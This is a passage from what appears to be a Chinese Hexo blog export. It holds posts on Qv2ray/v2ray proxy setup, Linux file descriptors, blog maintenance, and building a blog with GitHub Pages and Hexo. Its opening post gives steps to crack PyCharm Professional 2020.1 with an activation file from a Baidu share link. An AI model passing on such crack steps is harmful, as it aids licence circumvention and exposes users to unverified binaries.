<p>官网链接：<a href="https://www.jetbrains.com/pycharm/download/#section=linux">https://www.jetbrains.com/pycharm/download/#section=linux</a></p>
<p>注意只适用于 2020.1 版本</p>
</li>
<li><p>解压pycharm-professional-2020.1.tar.gz</p>
</li>
<li><p>来到<code>pycharm解压的路径/pycharm-2020.1/bin</code>下，终端运行 pycharm，命令<code>./pycharm.sh</code><br><img src="pycharm_sh.jpg" alt="pycharm"></p>
</li>
<li><p>选择Evaluate for free，之后点击Evaluate<br><img src="pycharm_evaluate.jpg" alt="pycharm"></p>
</li>
<li><p>在看到如下界面后开始进行永久激活Pycharm<br><img src="welcome_pycharm.jpg" alt="pycharm"></p>
</li>
</ol>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><ol>
<li><p>下载激活文件</p>
<blockquote>
<p><a href="https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw">https://pan.baidu.com/s/1_WvpBVTG7OGRoAvBRdlhnw</a><br>提取码：x1k5</p>
</blockquote>
</li>
<li><p>将激活文件拖到 pycharm 主页面，然后点击 restart<br><img src="activation_restart.jpg" alt="pycharm"></p>
</li>
<li><p>重启后选择:为Pycharm安装<br><img src="activation_install.jpg" alt="pycharm"></p>
</li>
<li><p>点击 是，会自动重启Pycharm<br><img src="activation_agent_success.jpg" alt="pycharm"></p>
</li>
<li><p>启动Pycharm后 在菜单Help-&gt;About下看到如下信息证明安装并激活成功！<br><img src="pycharm_about.jpg" alt="pycharm"></p>
</li>
</ol>
<p>本文转载自：<a href="https://www.cnblogs.com/fuhua/p/12799534.html#4565992">https://www.cnblogs.com/fuhua/p/12799534.html#4565992</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>软件</category>
      </categories>
      <tags>
        <tag>软件资源</tag>
      </tags>
  </entry>
  <entry>
    <title>博客运维记录</title>
    <url>/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4/%E5%8D%9A%E5%AE%A2%E8%BF%90%E7%BB%B4/</url>
    <content><![CDATA[<p>记录使用博客时遇到的问题，以及对博客的优化。</p>
<span id="more"></span>

<ol>
<li>本地 markdown 撰写<ul>
<li>官方介绍中本地的博文需写在 _post 目录下，而博文中添加照片的方式之一是在同目录下新建与博文名同名的文件夹，将图片放在该文件夹。</li>
<li>这样由于本地没有分类机制，非常不便于在本地对所有博文进行管理。</li>
<li>目前采用策略：写新的博文时，先在 _post 目录下新建以博文名命名的文件夹，在这一层撰写博文，再在内嵌套一个同样为以博文名命名的文件夹，放置图片。</li>
</ul>
</li>
<li>修改分类<ul>
<li>将分类名由”proxy”改成”Proxy”，发现在本地环境访问是正常的，但到我<code>github.io</code>上访问时会报 404 错误</li>
<li>实际上，Hexo 分类的修改是作用在文件夹上的，而我使用<code>hexo d</code>将博客部署到 github 上时，不会对原本的文件夹进行修改。也就是说 github 上依旧是”proxy”。</li>
</ul>
</li>
<li>恢复博客<ul>
<li>尝试了 <a href="https://github.com/blinkfox/hexo-theme-matery">matery</a> 主题，搭建完后发现对 markdown 的支持没有 next 的好，<code>python</code>的注释<code>#</code>容易被当成 markdown 的目录结构，引起目录混乱。</li>
<li>恢复 next 的过程中发现 github 博客源码的分支没有备份 next 主题，没办法只能重新配置，配置过程中遇到一个大坑，github star 排第一的<a href="https://github.com/iissnan/hexo-theme-next">iissnan/hexo-theme-next</a>有很多小问题，解决一个又会有下一个，本来打算重新换个主题了，最后尝试了 star 较少的<a href="https://github.com/theme-next/hexo-theme-next">theme-next/hexo-theme-next</a>，成功恢复。（原因：第一次配置的时候看的官方英文文档，写博客时记录的中文文档，结果两个文档指向不同的 github 仓库）</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>网站建设</category>
        <category>Hexo 博客</category>
      </categories>
      <tags>
        <tag>Hexo 博客</tag>
      </tags>
  </entry>
  <entry>
    <title>如何配置 v2ray 详细教程</title>
    <url>/%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%20v2ray%20%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%20v2ray%20%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>V2ray 是继 Shadowsocks(R) 后又一个体验很棒、功能非常强大的科学上网工具，近年来受到网友的广泛关注和喜爱。本教程详细介绍V2ray的安装和配置过程，让读者能迅速上手和使用V2ray。</p>
<span id="more"></span>

<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><blockquote>
<p>先创建安装 v2ray 的目录</p>
</blockquote>
<ol>
<li>下载 QT 实现的 v2ray 界面。在官网链接上找到最新的 release 下载。<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a> 。</p>
</blockquote>
</li>
</ol>
<p>比如，我目前下载的是Qv2ray.v2.2.3.linux-x64.AppImage。</p>
<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a></p>
</blockquote>
<ol start="2">
<li><p>下载v2ray核心</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/releases">https://github.com/v2ray/v2ray-core/releases</a></p>
</blockquote>
</li>
<li><p>解压v2ray核心文件</p>
</li>
<li><p>执行 Qv2ray 客户端，选择首选项 -&gt; 内核设置，修改下列两个路径</p>
<ul>
<li>V2Ray 核心文件可执行<strong>文件</strong>路径：<code>.../v2ray-windows-64/wv2ray.exe</code></li>
<li>V2Ray 资源<strong>目录</strong>：<code>.../v2ray-windows-64/</code></li>
</ul>
</li>
<li><p>点击检查 V2Ray 核心设置，通过即可.<br><img src="v2ray_settings.png" alt="v2ray settings"></p>
</li>
<li><p>返回 Qv2ray 主界面，选择：分组 -&gt; 订阅设置，勾选此分组是一个订阅，再填写上自己的 v2ray 订阅地址，点击更新订阅 -&gt; 确定（ok）</p>
</li>
<li><p>配置成功 Qv2ray 主界面默认分组内会出现多条线路，并显示链路的个数。</p>
</li>
</ol>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><blockquote>
<p>可自建 v2ray 目录，也可直接将 v2ray core 放在 ~/.config/qv2ray/vcore/ 中，这是 Qvray 默认路径。</p>
</blockquote>
<ol>
<li>下载QT实现的v2ray界面。在官网链接上找到最新的release下载。<blockquote>
<p><a href="https://github.com/Qv2ray/Qv2ray/releases">https://github.com/Qv2ray/Qv2ray/releases</a> 。</p>
</blockquote>
</li>
</ol>
<p>比如，我目前下载的是Qv2ray.v2.6.3.linux-x64.AppImage。</p>
<ol start="2">
<li>下载v2ray core核心文件。打开官方网站：<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/releases/">https://github.com/v2ray/v2ray-core/releases/</a> 。</p>
</blockquote>
</li>
</ol>
<p>选择下载文件v2ray-linux-64.zip。</p>
<ol start="3">
<li><p>进入 v2ray 下载的目录（我的是<code>~/v2ray</code>），执行下面命令给 Qv2ray 增加权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x ./Qv2ray.v2.6.3.linux-x64.AppImage  # 注意版本号</span><br></pre></td></tr></table></figure></li>
<li><p>启动 Qv2ray。仍然在v2ray根目录，执行下列终端命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./Qv2ray.v2.6.3.linux-x64.AppImage</span><br></pre></td></tr></table></figure></li>
<li><p>解压 v2ray core 核心文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unzip v2ray-linux-64.zip</span><br></pre></td></tr></table></figure></li>
</ol>
<p>注意不要用 <code>sudo</code> 解压，用 <code>sudo</code> 解压须给 <code>v2ray-linux-64</code> 加权限，容易造成权限紊乱。</p>
<ol start="5">
<li>在 Qv2ray 的首选项(Preference) 页面的内核设置（General Setting）中，设置v2ray核心文件的路径。</li>
</ol>
<p>默认的路径是<code>~/.config/qv2ray/vcore/</code>。如果没有新建 v2ray 目录结构，可以将 v2ray-linux-64.zip 解压后的文件都放置到这个目录里面。</p>
<p>如果自建 v2ray 目录，选择自己的 V2Ray 核心可执行文件路径和 V2Ray 资源目录。</p>
<p>最后，可以点击Check V2ray Core Setting按钮，验证这两个可执行文件的有效性。<br>   <img src="v2ray_linux_settings.png" alt="v2ray settings"></p>
<ol start="6">
<li>返回 Qv2ray 主界面，选择：分组 -&gt; 订阅设置，勾选此分组是一个订阅，再填写上自己的 v2ray 订阅地址，点击更新订阅 -&gt; 确定（ok）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 不可用</span><br><span class="line">https:&#x2F;&#x2F;cloudfront-cdn-hk-iplc1.com&#x2F;sub&#x2F;v&#x2F;wrvDgcKnw6nDncOAwrrCmMOOw5_CiH1-wqPCnMK1w4LCosOcw4B8wq1_w98k&#x3D;&#x2F;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>在 Qv2ray 的首选项（Preferences）窗口中，可以设置语言、系统代理、开机启动等。</p>
</li>
<li><p>如果想仅仅在 Chrome 浏览器上做网络翻墙功能，就在 Chrome 浏览器上安装 Proxy SwitchyOmega 插件。在插件的配置页面上，设置Proxy Server，采用协议SOCK5，代理服务器是本地127.0.0.1，端口是1088（具体端口号查看 Qv2ray的 首选项（Preferences）。</p>
</li>
<li><p>如果不想做全局的系统代理 System Proxy，在Qv2ray的首选项中取消系统代理即可。</p>
</li>
<li><p>Git 的代理需要另外配置。</p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>【Linux配置v2ray详细教程-Ubuntu为例】：<a href="https://www.boluo.in/1776.html">https://www.boluo.in/1776.htm</a>l</li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
        <category>proxy</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>彻底弄懂 Linux 下的文件描述符（fd）</title>
    <url>/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/</url>
    <content><![CDATA[<p>Linux 下的文件描述符</p>
<span id="more"></span>

<h2 id="1-从一个最常见的例子说起"><a href="#1-从一个最常见的例子说起" class="headerlink" title="1. 从一个最常见的例子说起"></a>1. 从一个最常见的例子说起</h2><p>在使用Linux的过程中， 我们平时经常看到下面这样的用法：</p>
<blockquote>
<p>echo log &gt; /dev/null 2&gt;&amp;1</p>
</blockquote>
<ul>
<li><blockquote>
<p>  ：表示将输出结果重定向到哪里，例如：echo “123” &gt; /home/123.txt</p>
</blockquote>
</li>
<li>/dev/null ：表示空设备文件<br>所以 echo log &gt; /dev/null 表示把日志输出到空文件设备，也就是将打印信息丢弃掉，屏幕上什么也不显示。</li>
<li>1  ：表示stdout标准输出</li>
<li>2  ：表示stderr标准错误</li>
<li>&amp;  ：表示等同于的意思</li>
</ul>
<p>所以  2&gt;&amp;1 表示2的输出重定向等同于1，也就是标准错误输出重定向到标准输出。因为前面标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<p>这个用法平时很常见，重点是为什么这里是用 2 和 1 ，不是3456什么的呢？这要从 Linux 中的文件描述符说起。</p>
<h2 id="2-Linux中的文件描述符（file-descriptor）"><a href="#2-Linux中的文件描述符（file-descriptor）" class="headerlink" title="2. Linux中的文件描述符（file descriptor）"></a>2. Linux中的文件描述符（file descriptor）</h2><p>我们知道在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。在操作这些所谓的文件的时候，我们每操作一次就找一次名字，这会耗费大量的时间和效率。所以Linux中规定每一个文件对应一个索引，这样要操作文件的时候，我们直接找到索引就可以对其进行操作了。</p>
<p>文件描述符（file descriptor）就是内核为了高效管理这些已经被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4……</p>
<p>Linux内核对所有打开的文件有一个文件描述符表格，里面存储了每个文件描述符作为索引与一个打开文件相对应的关系，简单理解就是下图这样一个数组，文件描述符（索引）就是文件描述符表这个数组的下标，数组的内容就是指向一个个打开的文件的指针。</p>
<p><img src="file_descriptor.png" alt="file descriptor"></p>
<p><strong>上面只是简单理解，实际上关于文件描述符，Linux内核维护了3个数据结构：</strong></p>
<ul>
<li>进程级的文件描述符表</li>
<li>系统级的打开文件描述符表</li>
<li>文件系统的i-node表</li>
</ul>
<p>一个 Linux 进程启动后，会在内核空间中创建一个 PCB(Process Control Block) 控制块，PCB 内部有一个文件描述符表（File descriptor table），记录着当前进程所有可用的文件描述符，也即当前进程所有打开的文件。进程级的描述符表的每一条记录了单个进程所使用的文件描述符的相关信息，进程之间相互独立，一个进程使用了文件描述符3，另一个进程也可以用3。除了进程级的文件描述符表，系统还需要维护另外两张表：打开文件表、i-node 表。这两张表存储了每个打开文件的打开文件句柄（open file handle）。一个打开文件句柄存储了与一个打开文件相关的全部信息。</p>
<p><strong>系统级的打开文件描述符表：</strong></p>
<ul>
<li>当前文件偏移量（调用read()和write()时更新，或使用lseek()直接修改）</li>
<li>打开文件时的标识（open()的flags参数）</li>
<li>文件访问模式（如调用open()时所设置的只读模式、只写模式或读写模式）</li>
<li>与信号驱动相关的设置</li>
<li>对该文件i-node对象的引用，即i-node 表指针</li>
</ul>
<p><strong>文件系统的i-node表：</strong></p>
<ul>
<li><p>文件类型（例如：常规文件、套接字或FIFO）和访问权限</p>
</li>
<li><p>一个指针，指向该文件所持有的锁列表</p>
</li>
<li><p>文件的各种属性，包括文件大小以及与不同类型操作相关的时间戳</p>
</li>
<li><p>文件描述符、打开的文件句柄以及i-node之间的关系如下图：<br><img src="relationship.png" alt="relationship"></p>
</li>
<li><p>在进程 A 中，文件描述符 1 和 20 都指向了同一个打开文件表项，标号为 23（指向了打开文件表中下标为 23 的数组元素），这可能是通过调用 dup()、dup2()、fcntl() 或者对同一个文件多次调用了 open() 函数形成的。</p>
</li>
<li><p>进程 A 的文件描述符 2 和进程 B 的文件描述符 2 都指向了同一个文件，这可能是在调用 fork() 后出现的（即进程 A、B 是父子进程关系），或者是不同的进程独自去调用 open() 函数打开了同一个文件，此时进程内部的描述符正好分配到与其他进程打开该文件的描述符一样。</p>
</li>
<li><p>进程 A 的描述符 0 和进程 B 的描述符 3 分别指向不同的打开文件表项，但这些表项均指向 i-node 表的同一个条目（标号为 1976）；换言之，它们指向了同一个文件。发生这种情况是因为每个进程各自对同一个文件发起了 open() 调用。同一个进程两次打开同一个文件，也会发生类似情况。 </p>
</li>
</ul>
<p><strong>这就说明：同一个进程的不同文件描述符可以指向同一个文件；不同进程可以拥有相同的文件描述符；不同进程的同一个文件描述符可以指向不同的文件（一般也是这样，除了 0、1、2 这三个特殊的文件）；不同进程的不同文件描述符也可以指向同一个文件。</strong></p>
<h2 id="3-Linux上打开文件举例"><a href="#3-Linux上打开文件举例" class="headerlink" title="3. Linux上打开文件举例"></a>3. Linux上打开文件举例</h2><p>比如在Linux上用 vim test.py 打开一个文件，保持打开状态，再新打开一个新的shell，输入命令pidof vim 获取vim进程的pid号，然后 ll  /proc/$pid/fd 查看vim 进程所使用的文件描述符列表。<br><img src="example_vim.png" alt="example vim"></p>
<p>/dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。因为我是通过Xshell远程登录的，所以标准输入0，标准输出1，标准错误2的文件描述符都指向虚拟终端控制台 /dev/pts/6 。再看下面是新打开的 test.py 的文件描述符，竟然是4，说好的从3开始呢？</p>
<p>这个我也困扰了好久，查了各种资料，终于在一个大佬的帮助下在一个论坛找到原因，有时候中文查不到还是要试试英文搜索啊。因为vim这种编辑器的原理是先打开源文件并拷贝，然后关闭源文件再打开自己的副本，修改完文件保存的时候直接将副本重命名覆盖源文件。所以打开源文件的时候用的文件描述符3，然后打开自己的副本是时候就该用文件描述符4了，然后关闭源文件，文件描述符3就被释放了，我们查看的时候就只剩下了4，这里它指向的是vim创建的副本文件。这里只是说个大概意思，具体深究要去深入了解一下<a href="https://blog.csdn.net/weixin_43535689/article/details/104750148">vim的实现原理——奥尔特星云大使</a>，下面是当时我看到的论坛上的资料截图，链接在这：<a href="https://stackoverflow.com/questions/48588284/lsof-command-can-not-return-files-being-opened-by-kwrite">StackOverFlow</a>。<br><img src="stackoverflow_vim.png" alt="stackoverflow vim"></p>
<h2 id="4-C语言中文件描述符的使用"><a href="#4-C语言中文件描述符的使用" class="headerlink" title="4. C语言中文件描述符的使用"></a>4. C语言中文件描述符的使用</h2><p>C语言中可以通过 open 函数返回一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test.c 文件，输入下面代码保存。 编译后执行，发现新打开文件的文件描述符是3。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;test.py&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;test.py fd = %d \n&quot;</span>, fd);  <span class="comment">// test.py fd = 3</span></span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-Python中文件描述符的使用"><a href="#5-Python中文件描述符的使用" class="headerlink" title="5. Python中文件描述符的使用"></a>5. Python中文件描述符的使用</h2><p>Python中通过 sys 模块封装了标准输入、标准输出和错误输出。通过我们平时常用的内建函数 open 可以获取一个文件的文件描述符，首先创建一个 test.py 文件用于打开，然后创建一个 test2.py 文件，输入下面代码保存。 执行，发现新打开文件的文件描述符是3。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdin fd = &#x27;</span>, sys.stdin.fileno())  // stdin fd = <span class="number">0</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stdout fd = &#x27;</span>, sys.stdout.fileno())  // stdout fd = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stderr fd = &#x27;</span>, sys.stderr.fileno())  // stderr fd = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.py&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test.py fd = &#x27;</span>, f.fileno())  // test.py fd = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="6-Linux配置系统最大打开文件描述符个数"><a href="#6-Linux配置系统最大打开文件描述符个数" class="headerlink" title="6. Linux配置系统最大打开文件描述符个数"></a>6. Linux配置系统最大打开文件描述符个数</h2><h3 id="系统级限制"><a href="#系统级限制" class="headerlink" title="系统级限制"></a>系统级限制</h3><p>理论上系统内存有多少就可以打开多少的文件描述符，但是在实际中内核是会做相应的处理，一般最大打开文件数会是系统内存的10%（以KB来计算），称之为系统级限制。这个数字可以通过 cat /proc/sys/fs/file-max 或者 sysctl -a | grep fs.file-max 命令查看。</p>
<p>更改系统级限制有临时更改和永久更改两种方式：</p>
<ul>
<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 sysctl -w fs.file-max=xxxx，其中xxxx就是要设置的数字。</li>
<li>永久更改：vim编辑 /etc/sysctl.conf 文件，在后面添加 fs.file-max=xxxx，其中xxxx就是要设置的数字。保存退出后还要使用sysctl -p 命令使其生效。</li>
</ul>
<h3 id="用户级限制"><a href="#用户级限制" class="headerlink" title="用户级限制"></a>用户级限制</h3><p>同时为了控制每个进程消耗的文件资源，内核也会对单个进程最大打开文件数做默认限制，即用户级限制。32位系统默认值一般是1024，64位系统默认值一般是65535，可以使用 ulimit -n 命令查看。</p>
<p>更改用户级限制也有临时更改和永久更改两种方式：</p>
<ul>
<li>临时更改：session断开或者系统重启后会恢复原来的设置值。使用命令 ulimit -SHn xxxx 命令来修改，其中xxxx就是要设置的数字。</li>
<li>永久更改：vim编辑 /etc/security/limits.conf 文件，修改其中的 hard nofile xxxx 和 soft nofile xxxx，其中xxxx就是要设置的数字。保存后退出。关于hard和soft的区别，参照下面参考链接中的第5个。</li>
</ul>
<h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><ol>
<li><a href="https://blog.csdn.net/cywosp/article/details/38965239">每天进步一点点——Linux中的文件描述符与打开文件之间的关系——cywosp</a></li>
<li><a href="http://c.biancheng.net/view/3066.html">Linux文件描述符到底是什么？——C语言中文网</a></li>
<li><a href="https://www.jianshu.com/p/0ff9ff1d108e">句柄和文件描述符（FD）——阳光丶不锈</a></li>
<li><a href="https://juejin.cn/post/6844903962043236365#heading-0">带你破案：文件描述符到底是什么？——vran</a></li>
<li><a href="http://www.ideabuffer.cn/2016/11/20/Linux%E9%85%8D%E7%BD%AE%E8%B0%83%E4%BC%98%EF%BC%9A%E6%9C%80%E5%A4%A7%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%AA%E6%95%B0/">Linux配置调优：最大打开文件描述符个数——Idea Buffer</a></li>
<li><a href="%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%9A%84%E6%9C%80%E5%A4%A7%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E9%99%90%E5%88%B6">修改Linux系统下的最大文件描述符限制——BlueguyChui</a></li>
</ol>
<p>————————————————<br>版权声明：本文为CSDN博主「杰克小麻雀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yushuaigee/article/details/107883964">https://blog.csdn.net/yushuaigee/article/details/107883964</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Github + Hexo 搭建博客</title>
    <url>/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20Github%20+%20Hexo%20%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<blockquote>
<p>搭建初衷：个人喜欢在本地用 markdown 来记录。之前使用过博客园、印象笔记等，发现都有不便之处。博客园上在发文时，还需要来调整格式，且不能将本地的 md 文件直接上传，会增加很多工作；而在印象笔记上，不开会员会有诸多的限制，其中限制终端登录数量，以及不同终端不能编辑等问题无法接受。于是产生了一种需求:我只要将自己编写的 md 上传，就能形成良好的博客效果，格式固定,且便于维护和浏览,。在 Github Pages 上搭建博客基本能够满足我的需求。</p>
</blockquote>
<blockquote>
<p>Github Pages 上搭建博客的弊端：</p>
<ol>
<li>部署在 Github 上，需要科学上网</li>
<li>整个流程：撰写 md 文档 ——&gt; Hexo 生成静态网页 ——&gt; 部署到Github Pages ——&gt;  浏览</li>
<li>维护一个静态网站，需要有容灾和备份的意识和能力。</li>
</ol>
</blockquote>
<span id="more"></span>

<h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p>
<ul>
<li>Node.js：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></li>
<li>Git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li>
</ul>
<p>下载 Node.js 和 Git 程序并安装，一路点 “下一步” 按默认配置完成安装。</p>
<p>安装完成后，Win+R 输入 cmd 并打开，依次输入 node -v、npm -v 和 git –version 并回车，如下图出现程序版本号即可<br><img src="version.png" alt="test"></p>
<h2 id="2-连接博客"><a href="#2-连接博客" class="headerlink" title="2. 连接博客"></a>2. 连接博客</h2><p>使用邮箱注册 GitHub 账户，选择免费账户（Free），并完成邮件验证。</p>
<p>右键 -&gt; Git Bash Here，<strong>设置用户名和邮箱</strong>：</p>
<blockquote>
<p>git config –global user.name “GitHub 用户名”<br>git config –global user.email “GitHub 邮箱”</p>
</blockquote>
<p><strong>创建 SSH 密匙</strong></p>
<blockquote>
<p>输入 ssh-keygen -t rsa -C “GitHub 邮箱”，然后一路回车。</p>
</blockquote>
<p><strong>添加密匙</strong>：</p>
<p>进入 [C:\Users\用户名.ssh] 目录（要显示隐藏文件，如果路径不对可以看上一步 <code>创建 SSH 密钥</code>时的输出内容，会有路径信息），打开公钥 id_rsa.pub 文件并复制里面的内容。</p>
<p>登陆 GitHub ，进入 Settings 页面，选择左边栏的 SSH and GPG keys，点击 New SSH key。</p>
<p>Title 随便取个名字，粘贴复制的 id_rsa.pub 内容到 Key 中，点击 Add SSH key 完成添加。</p>
<p><strong>验证连接</strong>：</p>
<blockquote>
<p>打开 Git Bash，输入 ssh -T <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#109;">&#103;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#109;</a> 出现 “Are you sure……”，输入 yes 回车确认</p>
</blockquote>
<blockquote>
<p>显示 “Hi xxx! You’ve successfully……” 即连接成功。</p>
</blockquote>
<h2 id="3-创建-Github-pages-仓库"><a href="#3-创建-Github-pages-仓库" class="headerlink" title="3. 创建 Github pages 仓库"></a>3. 创建 Github pages 仓库</h2><p>GitHub 主页右上角加号 -&gt; New repository：</p>
<ul>
<li>Repository name 中输入：用户名.github.io</li>
<li>勾选 Add a README file，会自动设置分支（分支名设置成master）：This will set  master as the default branch.</li>
<li>create repository</li>
</ul>
<h2 id="4-创建保存源码的分支"><a href="#4-创建保存源码的分支" class="headerlink" title="4. 创建保存源码的分支"></a>4. 创建保存源码的分支</h2><p>GitHub Pages 会自动部署静态网页文件，并将 master 分支作为部署的默认分支。为将静态网页和源文件（包含文章、主题等）分离开，强烈建议创建新分支，这样 master 分支只用来发布静态网页，而文档编辑和 Hexo 操作都在另一个分支上完成。</p>
<p>打开博客所在本地的目录，右键 -&gt; Git Bash Here，将 git 仓库 clone 至本地：</p>
<blockquote>
<p>git clone <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/用户名.github.io.git</a></p>
</blockquote>
<p>cd 命令进入仓库目录,再创建本地分支：</p>
<blockquote>
<p>git checkout -b hexo-source     # hexo-source 是我的分支名</p>
</blockquote>
<p>切换到新建分支(hexo-source是我的分支名)</p>
<blockquote>
<p>git checkout -b hexo-source </p>
</blockquote>
<p>查看本地分支(windows),此时 hexo-source 分支应该是高亮(当前分支)</p>
<blockquote>
<p>git branch -l</p>
</blockquote>
<h2 id="5-本地安装-Hexo-博客程序"><a href="#5-本地安装-Hexo-博客程序" class="headerlink" title="5. 本地安装 Hexo 博客程序"></a>5. 本地安装 Hexo 博客程序</h2><p>由于只能在空文件夹中生成 Hexo 项目,所以我们先将 <code>.git</code> 以及其他文件(如 <code>README.MD</code>)移出去,完成初始化后再移回来.</p>
<p>** 安装 Hexo **</p>
<blockquote>
<p>npm install -g hexo-cli</p>
</blockquote>
<p><strong>Hexo 初始化和本地预览</strong><br>初始化并安装所需组件：</p>
<blockquote>
<p>hexo init      # 初始化<br>npm install    # 安装组件</p>
</blockquote>
<p><strong>启动本地服务器及进行预览</strong></p>
<blockquote>
<p>hexo g   # 生成页面<br>hexo s   # 启动预览</p>
</blockquote>
<p>访问 <a href="http://localhost:4000，">http://localhost:4000，</a> 出现 Hexo 默认页面，本地博客安装成功！</p>
<h2 id="6-部署-Hexo-到-Github-Pages"><a href="#6-部署-Hexo-到-Github-Pages" class="headerlink" title="6. 部署 Hexo 到 Github Pages"></a>6. 部署 Hexo 到 Github Pages</h2><p>本地博客测试成功后，就是上传到 GitHub 进行部署，使其能够在网络上访问。</p>
<p>首先安装 hexo-deployer-git：</p>
<blockquote>
<p>npm install hexo-deployer-git –save</p>
</blockquote>
<p>然后修改 _config.yml 文件末尾的 Deployment 部分，修改成如下：</p>
